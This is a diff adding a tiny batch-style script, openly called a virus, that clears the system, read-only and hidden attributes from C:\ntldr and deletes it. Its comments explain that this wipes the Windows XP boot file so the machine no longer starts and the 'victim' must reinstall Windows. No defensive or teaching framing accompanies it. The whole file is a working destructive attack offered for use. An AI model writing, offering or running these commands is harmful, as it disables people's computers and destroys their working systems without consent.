@@ -1,0 +1,13 @@
+attrib -S -R -H C:\ntldr   // -S,-R,-H to clear system file attribute, read only attribute, hidden file attribute respectively
+del ntldr   // delete ntldr file 
+
+
+
+
+>> This virus will delete the boot file from the system and windows will not start       again.
+
+>> ntldr is boot file for win XP located at C:\ntldr
+
+>> location can differ in other OS
+
+>> After running the file, system will not reboot and a normal victim would definitely    install the windows again. 
